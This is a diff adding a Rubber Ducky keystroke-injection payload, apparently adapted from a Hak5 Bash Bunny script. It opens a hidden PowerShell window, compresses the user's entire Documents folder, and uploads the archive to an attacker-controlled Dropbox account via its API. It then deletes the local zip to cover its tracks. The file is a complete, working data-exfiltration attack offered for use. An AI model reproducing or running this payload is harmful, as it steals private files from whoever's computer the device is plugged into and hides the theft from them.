@@ -1,0 +1,49 @@
+# Dropbox Exfiltrator - zips Documents and uploads the zip file to dropbox
+#Single Stage Rubber Ducky Version Of Hak5 Bash Bunny Payload (Dropbox - Exfiltrator)
+#https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/exfiltration/dropbox-exfiltrator
+# Demo: Hak5 episode 2505
+
+ 
+DELAY 1000
+REM open the Run 
+GUI r
+REM Change this value depending on the computer you are using 
+DELAY 1000
+STRING powershell -w h
+ENTER
+DELAY 500
+STRING Compress-Archive -Path $env:USERPROFILE\Documents\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
+ENTER
+DELAY 500
+STRING $TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+ENTER
+DELAY 500
+STRING $SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+ENTER
+DELAY 500
+STRING $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+ENTER
+DELAY 500
+STRING $authorization = "Bearer " + "Your Dropbox API Key Here"
+ENTER
+DELAY 500
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+ENTER
+DELAY 500
+STRING $headers.Add("Authorization", $authorization)
+ENTER
+DELAY 500
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+ENTER
+DELAY 500
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+ENTER
+DELAY 500
+STRING rm $SourceFilePath
+ENTER
+DELAY 500
+STRING exit
+ENTER
